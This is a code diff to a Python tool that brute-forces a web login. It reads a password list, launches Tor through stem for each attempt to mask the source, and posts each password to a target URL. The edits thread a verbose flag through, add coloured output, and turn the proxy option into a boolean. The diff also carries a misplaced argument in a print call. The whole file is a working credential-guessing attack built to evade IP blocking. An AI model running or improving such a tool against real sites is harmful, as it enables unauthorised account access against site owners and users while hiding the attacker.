@@ -43,18 +43,18 @@ ERROR_MSGS = [
 ]
 
 # Set the proxy by TOR
-def set_proxy() -> None:
+def set_proxy(VERBOSE) -> None:
     SOCKS_PORT = 9050
-    tor_process = stem.process.launch_tor_with_config(
+    stem.process.launch_tor_with_config(
         config = {
             'SocksPort': str(SOCKS_PORT),
         },
-        init_msg_handler = lambda line: print(line) if re.search('Bootstrapped', line) else False,
+        init_msg_handler = (lambda line: print(colored(line), 'blue') if re.search('Bootstrapped', line) else False) if VERBOSE else None,
         tor_cmd = TOR_PATH
     )
 
 # Bruteforcing method using TOR proxies
-def bruteforce(username: str, password_list: str, URL, proxy: str) -> None:
+def bruteforce(username: str, password_list: str, URL, proxy: str, VERBOSE: bool) -> None:
     # Read the password list
     with open(password_list, 'r', errors='ignore') as password_list:
         passwords = password_list.readlines()
@@ -78,7 +78,7 @@ def bruteforce(username: str, password_list: str, URL, proxy: str) -> None:
     
     # Loop over the passwords
     for password in passwords:
-        set_proxy()
+        set_proxy(VERBOSE)
         data['password'] = password.strip()
         r = requests.post(URL, headers=headers, data=data, proxies=proxy)
         
@@ -98,10 +98,10 @@ def main(args: list[str]) -> None:
     '''
     USERNAME: str = ''
     PASSWORD_LIST: str = ''
-    PROXY: str = ''
-    MODE: str = ''
-    VERBOSE: bool = False
     URL: str = ''
+    MODE: str = ''
+    PROXY: bool = False
+    VERBOSE: bool = False
     
     for arg in args:
         if 'verbose' in arg:
@@ -117,13 +117,13 @@ def main(args: list[str]) -> None:
             PASSWORD_LIST = arg.split(':::')[1]
             
         if 'proxy' in arg:
-            PROXY = arg.split(':::')[1]
+            PROXY = True
         
         if 'url' in arg:
             URL = arg.split(':::')[1]
     
     if MODE == 'bruteforce':
-        bruteforce(USERNAME, PASSWORD_LIST, URL, PROXY)
+        bruteforce(USERNAME, PASSWORD_LIST, URL, PROXY, VERBOSE)
     
     
 if __name__ == '__main__':
